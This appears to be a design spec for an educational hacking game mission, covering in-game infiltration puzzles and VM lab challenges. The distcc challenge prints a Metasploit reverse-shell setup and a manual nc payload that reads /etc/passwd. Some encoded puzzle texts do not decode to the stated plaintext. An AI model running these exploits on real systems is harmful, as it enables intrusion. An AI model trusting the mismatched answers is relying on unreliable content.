# Mission 3: Technical Challenges Detailed Breakdown

**Mission:** Ghost in the Machine
**Stage:** 0 - Scenario Initialization
**Document:** Technical Challenges Specification
**Date:** 2025-12-24

---

## Overview

This document provides detailed specifications for all technical challenges in Mission 3, covering both Break Escape in-game mechanics and VM/SecGen challenges. Each challenge includes implementation details, educational objectives, difficulty scaling, and integration with the hybrid architecture.

---

## Break Escape In-Game Challenges

### Challenge 1: RFID Keycard Cloning (NEW MECHANIC)

#### Specification

**Challenge Type:** Physical Security Bypass
**Difficulty:** Intermediate
**Required Equipment:** RFID Cloner Device (provided by SAFETYNET)
**Target:** Victoria Sterling's executive keycard

#### Mechanic Details

**Cloning Method: Proximity-Based**
- **Activation:** Player equips RFID cloner device from inventory
- **Range:** 2 Game Units (GU) proximity to Victoria Sterling
- **Duration:** 10-second uninterrupted clone window
- **Visual Feedback:**
  - Progress bar overlay (0-100% over 10 seconds)
  - On-screen message: "Cloning RFID signature... X%"
  - Particle effect around Victoria's keycard (subtle blue glow)
  - Audio cue: Low electronic beeping during cloning

**Success Conditions:**
- Remain within 2 GU of Victoria for full 10 seconds
- Victoria doesn't move out of range
- Player not interrupted by guard patrol
- Victoria doesn't detect player behavior (suspicion mechanic)

**Failure Conditions:**
- Player moves out of range before 10 seconds complete
- Victoria moves away (normal walking behavior)
- Guard enters room and detects suspicious behavior
- Victoria's suspicion exceeds threshold (if implemented)

**Result:**
- Success: `victoria_keycard_clone` item added to inventory
- Failure: Must retry (no penalty, can attempt multiple times)

**Alternative Path: Social Engineering**
- If `victoria_trust >= 40`, Victoria grants server room access willingly
- Dialogue option: "I'd like to see your training infrastructure firsthand"
- Victoria: "Of course! Here's a temporary access card for our server room."
- Bypasses RFID cloning entirely (social engineering path)

#### Tutorial Integration

**Agent 0x99 Pre-Mission Briefing:**
> "Here's an RFID cloner. When you meet Victoria Sterling, stay close to her during conversation. The cloner has a 2-meter range. It'll take about 10 seconds to copy her keycard signature. Watch for the progress indicator. If she walks away, you'll need to re-engage.
>
> Alternatively, if you can build enough trust, she might grant you access voluntarily. Your call."

**First-Time Use Prompt:**
- On-screen: "Hold SPACE to activate RFID Cloner"
- Tutorial overlay: "Stay within range (2 GU) for 10 seconds"
- Progress bar appears with countdown timer

**Educational Context:**
- Teaches RFID security vulnerabilities
- Demonstrates proximity-based attacks
- Shows physical security bypass techniques
- Real-world relevance: Hotel room keycards, office access badges

#### Implementation Notes

**Technical Requirements:**
- Proximity detection system (check distance every tick)
- Progress tracking (accumulate time in range, reset if broken)
- Visual feedback system (progress bar, particle effects)
- Audio feedback (beeping during clone, success chime)
- Inventory integration (add cloned card item)
- Door unlock integration (cloned card works on server room RFID reader)

**Edge Cases:**
- What if player saves/loads during cloning? Reset progress
- What if Victoria is in conversation with another NPC? Cloning still possible
- What if guard sees cloning animation? Count as suspicious behavior
- What if player attempts to clone multiple times? Allow unlimited retries

**Difficulty Scaling:**
- Easy Mode: 5-second clone window, 3 GU range
- Normal Mode: 10-second clone window, 2 GU range
- Hard Mode: 15-second clone window, 1.5 GU range, Victoria moves more frequently

---

### Challenge 2: Lockpicking (Reinforced from M1-M2)

#### Locks in Mission 3

**Lock 1: IT Filing Cabinet**
- **Difficulty:** Easy
- **Location:** IT office (daytime accessible)
- **Contains:** Client list documents, password sticky notes
- **Educational:** Reinforces lockpicking from M1
- **Tutorial:** Brief reminder if player hasn't lockpicked recently

**Lock 2: Executive Office Door**
- **Difficulty:** Medium
- **Location:** Executive hallway (nighttime only)
- **Unlocks:** Access to Victoria Sterling's workspace
- **Contains:** Safe, computer with encoded files, whiteboard
- **Alternative:** Victoria grants access if trust >= 40 (social engineering)

**Lock 3: Security Room Door**
- **Difficulty:** Medium
- **Location:** Security hallway (nighttime only)
- **Unlocks:** Backup server room keycard (alternative to RFID cloning)
- **Contains:** Security logs, backup keycard
- **Purpose:** Fail-safe if RFID cloning unsuccessful

**Lock 4: Executive Safe**
- **Difficulty:** PIN-based (not lockpicking)
- **Location:** Victoria's office
- **Combination:** 2010 (WhiteHat Security founding year)
- **Clues:**
  - Reception plaque: "WhiteHat Security Services - Founded 2010"
  - Computer file: "Safe combo in founding year"
- **Contains:** LORE Fragment 2 (Exploit Catalog)

#### Lockpicking Progression

**Skill Reinforcement:**
- Players should be comfortable with lockpicking by M3
- No tutorial needed unless player skipped M1-M2
- Medium difficulty introduces timing complexity
- Success builds confidence for future missions

**Failure Consequences:**
- Failed lockpick: No penalty, can retry
- Detected by guard while lockpicking: Mission risk (stealth challenge)
- Breaking lockpick: Not implemented (player frustration mitigation)

---

### Challenge 3: Guard Patrol Stealth (Reinforced from M2)

#### Guard Specification

**Guard Profile:**
- **Name:** Night Security Guard
- **Patrol Route:** Hallway circuit (4 waypoints)
- **Behavior:** Methodical, predictable, professional
- **Detection:** Line-of-sight (LOS) based

**Patrol Route:**
```
Waypoint 1: (5, 2) Reception entrance - 15-tick pause
     ↓ (30 ticks travel)
Waypoint 2: (15, 2) Executive hallway - 15-tick pause
     ↓ (30 ticks travel)
Waypoint 3: (25, 2) Server room hallway - 20-tick pause
     ↓ (30 ticks travel)
Waypoint 4: (15, 8) IT hallway - 15-tick pause
     ↓ (30 ticks travel)
Loop back to Waypoint 1

Total Loop Time: ~180 ticks (~60 seconds at 3 ticks/second)
```

**Line of Sight:**
- **Range:** 150 pixels (~7.5 GU)
- **Angle:** 120° cone in facing direction
- **Visualize:** Red cone overlay (debug mode), subtle tension effect (gameplay)

**Detection States:**
1. **Unaware (0%):** Normal patrol
2. **Alert (1-50%):** "Did I see something?" - Pauses, looks around
3. **Suspicious (51-90%):** "Who's there?" - Investigates last known position
4. **Hostile (91-100%):** "INTRUDER!" - Calls backup, mission risk

**Player Detected Consequences:**
- First detection: Guard questions player
  - Player can use cover story (social engineering check)
  - Player can flee (restart stealth)
  - Player can bribe (if implemented)
- Second detection: Guard calls backup
  - Mission risk increases
  - Timer starts (5 minutes to complete mission)
- Third detection: Mission failed
  - "Security breach detected. Extraction aborted."

#### Stealth Strategies

**Strategy 1: Timing-Based Stealth (Recommended)**
- Observe guard patrol pattern
- Wait for guard to patrol away from target area
- Move during guard's pause at far waypoint
- Use 15-20 tick windows for quick actions (lockpicking, computer access)

**Strategy 2: Social Engineering**
- High influence with Victoria: Guard informed player is authorized
- Guard: "Ms. Sterling mentioned you'd be here. Carry on."
- Bypasses stealth challenge entirely

**Strategy 3: Distraction (Not Implemented in M3)**
- Reserved for future missions
- Could involve triggering alarms elsewhere, throwing objects, etc.

**Educational Objective:**
- Teaches operational security awareness
- Pattern recognition (guard patrol timing)
- Risk assessment (when to move vs. wait)
- Reinforces patience and observation

---

### Challenge 4: Social Engineering (Advanced)

#### NPC Targets

**Victoria Sterling (Primary Target)**

**Influence System:**
- **Starting Influence:** 50 (neutral - potential client)
- **Trust Threshold:** 40+ for alternative paths
- **Max Influence:** 100

**Influence Modifiers:**
| Dialogue Choice | Influence Change |
|----------------|------------------|
| "I'm impressed by your security methodology" | +10 |
| "What makes WhiteHat different from competitors?" | +5 |
| "I've researched your vulnerability disclosure process" | +15 |
| "I need to see your infrastructure firsthand" | -5 (suspicious) |
| "Your prices seem high compared to industry standard" | -10 |
| Demonstrate technical knowledge | +10 |
| Ask suspicious questions | -15 |

**Trust-Based Unlocks:**
- **Trust >= 30:** Victoria shares office layout information
- **Trust >= 40:** Victoria grants server room access (skip RFID cloning)
- **Trust >= 60:** Victoria hints at "special clients" (criminal intel)
- **Trust >= 80:** Victoria offers to recruit player (double agent reveal)

**James Park (Secondary Target)**

**Role:** Information source, innocent employee
**Influence System:** Basic (0-100, starts at 30)

**Information Extraction:**
| Topic | Influence Required | Information Gained |
|-------|-------------------|-------------------|
| Office layout | 20+ | Map of rooms and departments |
| Victoria's schedule | 40+ | "She usually leaves by 6 PM" |
| Security procedures | 50+ | Guard patrol timing, keycard access |
| Server room location | 30+ | "Third floor, east wing" |
| Client information | 60+ | "We work with some high-profile clients..." |

**Innocent Employee Dynamic:**
- James genuinely believes WhiteHat is legitimate
- Building trust provides intel but creates moral complexity
- If player exposes firm, James faces consequences
- Influences "protect James" moral choice later

**Night Security Guard (Tertiary Target)**

**Cover Story Validation:**
- If detected, guard challenges player
- Social engineering check (influence-based)

**Guard Dialogue:**
> "Hold on. This area is restricted after hours. Who are you?"

**Player Options:**
1. **"I'm working late with Ms. Sterling's authorization"** (victoria_trust >= 40 required)
   - Guard: "Let me verify..." [Calls Victoria]
   - If Victoria vouches: "Alright, carry on. Just stay in authorized areas."
   - If Victoria doesn't vouch: Mission risk
2. **"I'm a consultant doing a security audit"** (Influence check >= 25)
   - Success: Guard believes cover story temporarily
   - Failure: Guard suspicious, calls supervisor
3. **"Sorry, I got lost looking for the bathroom"** (Weak excuse, -20 influence)
   - Guard: "Bathrooms are downstairs. I'll escort you."
   - Forced to leave area, must re-infiltrate
4. **Run away** (Stealth challenge failed)
   - Guard calls backup, mission timer starts

**Educational Objective:**
- Social engineering tactics (trust building, cover stories)
- Manipulation vs. deception ethics
- Corporate environment infiltration
- Real-world phishing/pretexting parallels

---

### Challenge 5: Multi-Encoding Puzzle

#### Encoded Messages in Mission 3

**Message 1: ROT13 Whiteboard**

**Location:** Conference room whiteboard (photographable)
**Difficulty:** Easy
**Encoding:** ROT13

**Encoded Text:**
```
ZRRG JVGU GUR NEPUVGRPG - CEVBEVGVMR VASENFGEHPGHER RKCYBVGF
```

**Decoded Text:**
```
MEET WITH THE ARCHITECT - PRIORITIZE INFRASTRUCTURE EXPLOITS
```

**Discovery Method:**
- Visible during daytime reconnaissance
- Can photograph with in-game camera
- Player decodes using CyberChef workstation (server room)

**Educational Value:**
- Introduces ROT13 (classic Caesar cipher)
- Pattern recognition: All caps, English-looking text
- Teaches: Encoding vs. encryption distinction

---

**Message 2: Hex-Encoded Client List**

**Location:** Victoria's computer (executive office)
**Difficulty:** Medium
**Encoding:** Hexadecimal

**Encoded Text:**
```
5a45524f20444159205359 4e44494341544520434c49454e5420524f53544552

434c49454e54533a
52616e736f6d7761726520496e636f72706f7261746564
437269746963616c204d617373
536f6369616c204661627269
```

**Decoded Text:**
```
ZERO DAY SYNDICATE CLIENT ROSTER

CLIENTS:
Ransomware Incorporated
Critical Mass
Social Fabric
```

**Discovery Method:**
- Access Victoria's computer (requires executive office access)
- File named "CLIENT_LIST.txt" (hex content)
- Player copies hex, decodes at CyberChef

**Educational Value:**
- Hexadecimal encoding fundamentals
- ASCII to hex conversion understanding
- Pattern recognition: 2-character hex pairs (4E, 20, etc.)

---

**Message 3: Base64 Email Draft**

**Location:** Victoria's email client (computer)
**Difficulty:** Medium
**Encoding:** Base64

**Encoded Text:**
```
RnJvbTogVmljdG9yaWEgU3RlcmxpbmcKVG86IENpcGhlcgpTdWJqZWN0OiBRMyBQcmljaW5nIFVwZGF0ZQoKQ2lwaGVyLAoKUTMgZXhwbG9pdCBwcmljaW5nIHVwZGF0ZWQ6CgpDUklUSUNBTDogJDM1LDAwMCBiYXNlCkhJR0g6ICQxOCwwMDAgYmFzZQpNRURJVU06ICQ3LDUwMCBiYXNlCgpIZWFsdGhjYXJlIHByZW1pdW06ICszMCUKRW5lcmd5IHNlY3RvcjogKzQwJQoKUHJvRlRQRCBleHBsb2l0IHNvbGQgdG8gUmFuc29td2FyZSBJbmMgZm9yICQxMiw1MDAgKGhlYWx0aGNhcmUgcHJlbWl1bSkuCgotIFZpY3Rvcmlh
```

**Decoded Text:**
```
From: Victoria Sterling
To: Cipher
Subject: Q3 Pricing Update

Cipher,

Q3 exploit pricing updated:

CRITICAL: $35,000 base
HIGH: $18,000 base
MEDIUM: $7,500 base

Healthcare premium: +30%
Energy sector: +40%

ProFTPD exploit sold to Ransomware Inc for $12,500 (healthcare premium).

- Victoria
```

**Discovery Method:**
- Drafts folder in Victoria's email client
- Player copies Base64 string
- Decodes at CyberChef workstation

**Educational Value:**
- Base64 encoding (reinforced from M2)
- Email forensics
- Intelligence gathering from communications
- **CRITICAL REVEAL:** ProFTPD exploit sold to Ransomware Inc (M2 connection!)

---

**Message 4: Double-Encoded USB Drive**

**Location:** Hidden USB drive in Victoria's desk drawer (lockpick required)
**Difficulty:** Advanced
**Encoding:** ROT13 + Base64 (nested)

**Encoded Text (Layer 1 - Base64):**
```
R2VhejogR3VyIE5lcHV2Z3JwZydmIEVldmpyZXZpcnJmCgpQdW5ndWUsIFJhbmdlcmUgZXJzY2ViZ2VndnJhIGN5YnZiZXZndnJmIHNiZSBNMjoKCjEuIFZBU0VORkhHRVBHSFVSIFJLQ0dCV0dGIChDRVZCRVZHTCkKICAgU2JwaCZmdCBiYSBhcnJnYXBuZXIgZnJwZ2J5IEZQTlFOIGZsZmdyemYKICAgUmFyeXRsIHR5dnEgVlBGIGlocGFyZW9uYXZnbHZyZgoKMi4gUEVCRkYtUFJZWSBQQkJFUVZBTkdWQkEKICAgQ2ViaXZxciBFbmFmYmJ6bmpyZSBWYXAgamdudiBhcm5ndWFwbmVyIGdjZ3lidmdmCiAgIEZicHZueSBTbm9ldnAgamdjZ3lidmdnIGVicmd5bnZhZyBuYXEgcmFyeXRsIGhndnl2Z2xyZg==
```

**Decoded Text (Layer 1 - Base64 to ROT13):**
```
Trne: Gur Nepuvgrpg'f Qverpgvirf

Pvcure, Sbegure rkcybvgngvba cevbevgvrf sbe M2:

1. VASENFGEHPGHER RKCYBVGF (CEVBEVGL)
   Sbphf ba urnygupher frpgbe FPNQN flfgrzf
   Raretl tevq VPF ihyarenov
yvgvrf

2. PEBFF-PRYY PBBOPVARQVBA
   Cebivqr Enasbzjner Vap jvgu ubfcvgny gnetrgarq rpbabzl cnpxntrf

3. BIRENAGVBANY FRPHEVGL
   JuvgrUng Frphevgl sebag zhfg eranva pbaivaprq
   Ivpgbevn Fgreyvat nhgubevmrq gb erpehvg qbhoyr ntragf

- Gur Nepuvgrpg
```

**Decoded Text (Layer 2 - ROT13 to Plaintext):**
```
From: The Architect's Directives

Cipher, Future exploitation priorities for Q4:

1. INFRASTRUCTURE EXPLOITS (PRIORITY)
   Focus on healthcare sector SCADA systems
   Energy grid ICS vulnerabilities

2. CROSS-CELL COORDINATION
   Provide Ransomware Inc with hospital targeted economy packages

3. OPERATIONAL SECURITY
   WhiteHat Security front must remain convinced
   Victoria Sterling authorized to recruit double agents

- The Architect
```

**Discovery Method:**
1. Lockpick Victoria's desk drawer (executive office)
2. Find hidden USB drive
3. Insert USB into computer
4. File contains Base64 string
5. Decode Base64 → reveals ROT13 text
6. Decode ROT13 → reveals plaintext

**Educational Value:**
- Multi-stage decoding (critical thinking)
- Nested encoding patterns
- Advanced CyberChef workflows
- Persistence in cryptanalysis
- **CAMPAIGN REVEAL:** First direct communication from The Architect!

---

## VM/SecGen Challenges

### SecGen Scenario: "Information Gathering: Scanning"

**Network:** 192.168.100.0/24 (Zero Day training network)
**Target Host:** 192.168.100.50
**Services:** FTP (21), SSH (22), HTTP (80), distcc (3632)

---

### VM Challenge 1: Network Port Scanning

**Objective:** Scan Zero Day's training network to identify open ports and services

**Tools:** nmap

**Command Examples:**
```bash
# Basic scan
nmap 192.168.100.50

# Service version detection
nmap -sV 192.168.100.50

# Full scan with OS detection
nmap -A 192.168.100.50

# Scan entire subnet
nmap 192.168.100.0/24
```

**Expected Output:**
```
Starting Nmap 7.80 ( https://nmap.org )
Nmap scan report for 192.168.100.50
Host is up (0.00045s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.4
80/tcp   open  http        Apache httpd 2.4.6
3632/tcp open  distcc      distccd v1

Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds
```

**Flag:** `flag{network_scan_complete}`

**Submission:** Drop-site terminal in server room

**Educational Objectives:**
- Understand port scanning fundamentals
- Identify common port numbers (21=FTP, 22=SSH, 80=HTTP)
- Service version detection with -sV flag
- Network mapping methodology

**In-Game Integration:**
- Agent 0x99 tutorial: "Start with nmap to map the network. Look for open ports and service versions."
- Drop-site terminal displays simplified nmap results with annotations
- Flag submission unlocks server room workstation access

**Difficulty:** Easy

---

### VM Challenge 2: Banner Grabbing (FTP Service)

**Objective:** Connect to FTP service and extract intelligence from banner

**Tools:** netcat (nc), ftp

**Command:**
```bash
# Netcat banner grab
nc 192.168.100.50 21

# Or using FTP client
ftp 192.168.100.50
```

**Banner Output:**
```
220 (vsFTPd 3.0.3)
220 Zero Day Syndicate Training Network
220 INTEL: Client codename "GHOST" - Last connection 2024-05-15
220 flag{ftp_intel_gathered}
```

**Flag:** `flag{ftp_intel_gathered}`

**Submission:** Drop-site terminal

**Educational Objectives:**
- Banner grabbing for intelligence gathering
- FTP service enumeration
- Information leakage from service banners
- Netcat fundamentals

**In-Game Integration:**
- Banner text reveals client codename "GHOST" (M2 antagonist!)
- Connects to Ransomware Incorporated
- Unlocks client codename list document in-game

**Difficulty:** Easy

---

### VM Challenge 3: HTTP Service Analysis + Base64 Decoding

**Objective:** Analyze HTTP service and decode Base64-encoded flag in HTML

**Tools:** curl, wget, browser, base64

**Command:**
```bash
# Fetch HTTP page
curl http://192.168.100.50

# Or view source in browser
wget -O - http://192.168.100.50
```

**HTML Output:**
```html
<!DOCTYPE html>
<html>
<head><title>WhiteHat Security Services</title></head>
<body>
<h1>Training Network - Authorized Personnel Only</h1>
<p>Welcome to the Zero Day Syndicate training environment.</p>

<!-- Pricing Intel (Encoded): ZmxhZ3twcmljaW5nX2ludGVsX2RlY29kZWR9 -->

<p>Contact admin@whitehat-sec.local for access.</p>
</body>
</html>
```

**Decoding:**
```bash
echo "ZmxhZ3twcmljaW5nX2ludGVsX2RlY29kZWR9" | base64 -d
# Output: flag{pricing_intel_decoded}
```

**Flag:** `flag{pricing_intel_decoded}`

**Submission:** Drop-site terminal

**Educational Objectives:**
- HTTP service analysis
- HTML source code examination
- Base64 decoding (reinforced from M2)
- Hidden data in web services

**In-Game Integration:**
- Decoded flag reveals pricing intelligence
- Connects to Victoria's email about exploit pricing
- Unlocks exploit catalog LORE fragment

**Difficulty:** Medium

---

### VM Challenge 4: distcc Exploitation (CVE-2004-2687)

**Objective:** Exploit distcc vulnerability to gain shell access and find operational logs

**Vulnerability:** distcc daemon RCE (CVE-2004-2687)
**Tools:** Metasploit, manual exploitation

**Method 1: Metasploit**
```bash
msfconsole
use exploit/unix/misc/distcc_exec
set RHOSTS 192.168.100.50
set RPORT 3632
set PAYLOAD cmd/unix/reverse
set LHOST [your IP]
set LPORT 4444
exploit
```

**Method 2: Manual Exploitation**
```bash
# distcc allows arbitrary command execution
nc 192.168.100.50 3632
DIST00000001ARGC00000002ARGV00000006/bin/shARGV0000000D-c
ARGV00000015id; cat /etc/passwd
```

**Shell Access:**
```bash
# Once shell obtained
cd /var/logs/zeroday
cat operational_log.txt

# Contents reveal:
# ProFTPD exploit (CVE-2010-4652) sold to Ransomware Incorporated
# Client: "Ghost" - St. Catherine's Hospital target
# Payment: $12,500 (healthcare sector premium)
# flag{distcc_legacy_compromised}
```

**Flag:** `flag{distcc_legacy_compromised}`

**Submission:** Drop-site terminal

**Educational Objectives:**
- Legacy service exploitation
- CVE research and exploitation
- Remote code execution techniques
- Metasploit framework usage
- Post-exploitation enumeration

**In-Game Integration:**
- **CRITICAL REVEAL:** Operational logs show M2 hospital attack connection!
- Player discovers: "Zero Day sold the exploit used in Mission 2!"
- Unlocks "aha moment" dialogue with Agent 0x99
- Sets up closing debrief revelation

**Difficulty:** Advanced

---

## Challenge Integration Matrix

| Challenge | Type | Difficulty | Unlocks | Educational Focus |
|-----------|------|------------|---------|-------------------|
| RFID Cloning | In-Game | Intermediate | Server room access | Physical security, proximity attacks |
| Lockpicking | In-Game | Easy-Medium | Executive office, safe | Physical security (reinforced) |
| Guard Stealth | In-Game | Medium | Undetected infiltration | Operational security, timing |
| Social Engineering | In-Game | Intermediate | Alternative paths, intel | Trust exploitation, cover stories |
| Multi-Encoding | In-Game | Medium-Advanced | LORE fragments, intel | ROT13, Hex, Base64, nested decoding |
| Network Scanning | VM | Easy | Network map, access | Port scanning, service enumeration |
| Banner Grabbing | VM | Easy | Client codenames | Intelligence gathering, netcat |
| HTTP Analysis | VM | Medium | Pricing intel | Web reconnaissance, Base64 |
| distcc Exploit | VM | Advanced | M2 connection reveal | Legacy exploitation, RCE, CVE research |

---

## Difficulty Scaling Options

### Easy Mode
- RFID clone: 5 seconds, 3 GU range
- Guard patrol: Slower, 200px LOS
- Lockpicking: Easier timing windows
- Encoding: ROT13 and Base64 only (skip Hex, nested encoding)
- VM: Tutorial mode with guided commands

### Normal Mode (Default)
- RFID clone: 10 seconds, 2 GU range
- Guard patrol: Standard (60s loop, 150px LOS)
- Lockpicking: Medium difficulty
- Encoding: All types including nested
- VM: Standard challenges

### Hard Mode
- RFID clone: 15 seconds, 1.5 GU range, Victoria moves more
- Guard patrol: Faster, 120px LOS, erratic timing
- Lockpicking: Harder timing, limited lockpicks
- Encoding: Additional obfuscation layers
- VM: No hints, advanced exploitation required

---

## Educational Assessment Rubric

**Network Reconnaissance (NSS):**
- ✅ Can explain purpose of port scanning
- ✅ Identifies common ports (21, 22, 80, 3632)
- ✅ Understands service enumeration via banners
- ✅ Applies nmap for network mapping

**Service Exploitation (SS):**
- ✅ Recognizes legacy service vulnerabilities
- ✅ Researches CVEs (CVE-2004-2687)
- ✅ Applies exploitation tools (Metasploit)
- ✅ Conducts post-exploitation enumeration

**Encoding Analysis (ACS):**
- ✅ Distinguishes ROT13, Hex, Base64
- ✅ Decodes multi-stage nested encoding
- ✅ Recognizes encoding patterns
- ✅ Uses CyberChef effectively

**Intelligence Correlation (SOC):**
- ✅ Combines physical + digital evidence
- ✅ Recognizes patterns across data sources
- ✅ Correlates M2 connection (ProFTPD exploit sale)
- ✅ Systematic investigation approach

**Physical Security (General):**
- ✅ Understands RFID vulnerabilities
- ✅ Lockpicking techniques (reinforced)
- ✅ Stealth and timing awareness
- ✅ Social engineering for bypass

---

## Implementation Priority

**Phase 1 (Critical Path):**
1. RFID cloning mechanics (new system)
2. Guard patrol integration (reinforced from M2)
3. VM challenges (network scan, banner grab, distcc)
4. Drop-site terminal integration

**Phase 2 (Enhanced Experience):**
5. Social engineering paths (Victoria trust system)
6. Multi-encoding puzzle (CyberChef integration)
7. LORE fragment placement
8. Safe PIN puzzle (2010 clue system)

**Phase 3 (Polish):**
9. Tutorial overlays (RFID, network scan)
10. Difficulty scaling options
11. Alternative path balancing
12. Educational feedback system

---

**Document Status:** ✅ COMPLETE
**Next Document:** narrative_themes.md
**Integration:** Ready for Stage 1 (Narrative Structure)

---
